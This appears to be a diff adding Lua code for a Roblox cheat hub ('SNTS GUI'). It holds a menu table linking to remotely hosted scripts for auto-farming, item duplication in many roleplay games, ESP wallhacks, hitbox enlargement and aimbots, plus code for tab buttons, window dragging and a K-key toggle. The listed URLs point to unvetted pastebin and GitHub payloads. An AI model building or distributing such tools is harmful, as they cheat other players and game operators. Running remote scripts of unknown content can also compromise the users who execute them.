+        {
+          title = "PART NAME VIEWER",
+          description = "Displays all part names in workspace",
+          url = "https://pastebin.com/raw/Xr2Afcpd",
+        },
+        {
+          title = "BOX JOB AUTO FARM",
+          description = "Auto completes box delivery jobs",
+          url = "https://pastebin.com/raw/nh2UQLkZ",
+        },
+        {
+          title = "MIDNIGHT AUTO JOB BOX",
+          description = "Auto job farming system for Midnight RP",
+          url = "https://pastebin.com/raw/rfz9TUrT",
+        },
+        {
+          title = "BILIBID RP AUTO LOOT",
+          description = "Loots RP rewards in Bilibid automatically",
+          url = "https://pastebin.com/raw/n29hEpsh",
+        },
+        {
+          title = "URBAN DECAY AUTO TRAPHOUSE",
+          description = "Auto collects rewards in Urban Decay RP",
+          url = "https://pastebin.com/raw/VfE53wQM",
+        },
+        {
+          title = "BAGONG BARYO AUTO CONSERVE",
+          description = "Auto collects resources in Bagong Baryo RP",
+          url = "https://pastebin.com/raw/SqZWfe5B",
+        },
+        {
+          title = "BUHAY KULUNGAN AUTO FARM",
+          description = "Farm and auto collect in Buhay Kulungan RP",
+          url = "https://pastebin.com/raw/nGGYBcFP",
+        },
+        {
+          title = "TBC FISH FARM",
+          description = "Auto fish farming system for TBC RP",
+          url = "https://pastebin.com/raw/JxHXAJMS",
+        },
+      },
+    },
+    dupe = {
+      title = "DUPE SCRIPT",
+      items = {
+        {
+          title = "GUN SHOP",
+          description = "Duplicate guns instantly from shop",
+          url = "https://pastebin.com/raw/6ULHHRdW",
+        },
+        {
+          title = "BM STORAGE",
+          description = "Duplicate blackmarket storage items",
+          url = "https://pastebin.com/raw/XS9uhSzQ",
+        },
+        {
+          title = "PURCHASE EVENT",
+          description = "Duplicate purchases through event handler",
+          url = "https://pastebin.com/raw/T8xWb2D9",
+        },
+        {
+          title = "NEXOPOLIS",
+          description = "Dupe menu for Nexopolis RP",
+          url = "https://pastebin.com/raw/82nznhQx",
+        },
+        {
+          title = "BUHAY BARANGAY RP",
+          description = "Duplicate items in Buhay Barangay RP",
+          url = "https://pastebin.com/raw/inzDSGWn",
+        },
+        {
+          title = "DOWNTOWN PINAS RP",
+          description = "Duplication system for Downtown RP",
+          url = "https://raw.githubusercontent.com/abacada0917/DOWNTOWN-ON-DOWN/refs/heads/main/BOBO",
+        },
+        {
+          title = "DOWNTOWN BM STORAGE",
+          description = "BM dupe system for Downtown RP",
+          url = "https://raw.githubusercontent.com/abacada0917/DOWNTOWN-SUPER-DOWN/refs/heads/main/DOWNTOWN%20TANGA",
+        },
+        {
+          title = "STIM RP",
+          description = "Dupe inventory items in STIM RP",
+          url = "https://raw.githubusercontent.com/abacada0917/BISAYA/refs/heads/main/STIM",
+        },
+        {
+          title = "URBAN CITY RP MENU",
+          description = "Duplicate system for Urban City RP",
+          url = "https://pastebin.com/raw/wZKtGReF",
+        },
+        {
+          title = "PARAISO CITY RP",
+          description = "Paraiso City RP dupe utilities",
+          url = "https://pastebin.com/raw/SM6y8KBJ",
+        },
+        {
+          title = "KALYE ONSE RP",
+          description = "Kalye Onse RP item duplication",
+          url = "https://pastebin.com/raw/x4Z6xqgx",
+        },
+        {
+          title = "PARESAN NI DIWATA",
+          description = "Duplication features for Paresan RP",
+          url = "https://pastebin.com/raw/uErRfEFM",
+        },
+        {
+          title = "BAGONG BARYO SPAWN AYUDA",
+          description = "Spawn ayuda duping tool",
+          url = "https://pastebin.com/raw/Ubve0HjQ",
+        },
+        {
+          title = "TBC DUPE MENU",
+          description = "Dupe items for The Billionaire City",
+          url = "https://pastebin.com/raw/kKjpjFyQ",
+        },
+        {
+          title = "TONDO STREET RP",
+          description = "Dupe items for Tondo Street Rp",
+          url = "https://pastebin.com/raw/9JTC90YH",
+        },
+        {
+          title = "BARYO ROLEPLAY",
+          description = "Dupe items for Baryo Roleplay",
+          url = "https://pastebin.com/raw/HjcATKKk",
+        },
+      },
+    },
+    player = {
+      title = "PLAYER SCRIPT",
+      items = {
+        {
+          title = "BOOST FPS + NVIDIA GRAPHICS",
+          description = "Optimizes graphics for low-end devices",
+          url = "https://pastebin.com/raw/j8UXdGti",
+        },
+        {
+          title = "HIGHLIGHT PLAYERS",
+          description = "Highlights every player for visibility",
+          url = "https://pastebin.com/raw/XZfkaXzr",
+        },
+        {
+          title = "ESP",
+          description = "Wallhack / Player locator system",
+          url = "https://pastebin.com/raw/VvBhX4ME",
+        },
+        {
+          title = "BIG HEAD",
+          description = "Enlarges player heads for easier targeting",
+          url = "https://pastebin.com/raw/rMV903i5",
+        },
+        {
+          title = "AIMBOT PC",
+          description = "Precision aimbot for PC users",
+          url = "https://pastebin.com/raw/VUA1Fhtm",
+        },
+        {
+          title = "AIMBOT DETECTOR",
+          description = "Detects aimbot users in-game",
+          url = "https://pastebin.com/raw/1TMMk4Y3",
+        },
+      },
+    },
+  }
+
+  f15(v17.scrollingFrame, v17.listLayout, v17.tabNameLabel, v18.main)
+
+  v17.buttons.main.MouseButton1Click:Connect(function()
+    f15(v17.scrollingFrame, v17.listLayout, v17.tabNameLabel, v18.main)
+  end)
+
+  v17.buttons.dupe.MouseButton1Click:Connect(function()
+    f15(v17.scrollingFrame, v17.listLayout, v17.tabNameLabel, v18.dupe)
+  end)
+
+  v17.buttons.player.MouseButton1Click:Connect(function()
+    f15(v17.scrollingFrame, v17.listLayout, v17.tabNameLabel, v18.player)
+  end)
+
+  f1(v17.shortcuts, localPlayer2)
+  local v19 = false
+  local position2, position3
+
+  v17.mainFrame.InputBegan:Connect(function(input5)
+    if input5.UserInputType == Enum.UserInputType.MouseButton1 then
+      v19 = true
+      position2 = input5.Position
+      position3 = v17.mainFrame.Position
+    end
+  end)
+
+  v17.mainFrame.InputChanged:Connect(function(input6)
+    if input6.UserInputType == Enum.UserInputType.MouseMovement and v19 then
+      local v20 = input6.Position - position2
+
+      v17.mainFrame.Position = UDim2.new(
+        position3.X.Scale, position3.X.Offset + v20.X, position3.Y.Scale,
+        position3.Y.Offset + v20.Y
+      )
+    end
+  end)
+
+  userInputService.InputEnded:Connect(function(input7)
+    if input7.UserInputType == Enum.UserInputType.MouseButton1 then
+      v19 = false
+    end
+  end)
+
+  local v21 = true
+
+  userInputService.InputBegan:Connect(function(input8, p23)
+    if p23 then
+      return
+    end
+
+    if input8.KeyCode == Enum.KeyCode.K then
+      v21 = not v21
+      v17.mainFrame.Visible = v21
+    end
+  end)
+
+  return v17
+end)
+
+if not v15 then
+  warn("[SNTS GUI] Failed to initialize: " .. tostring(v16))
+end
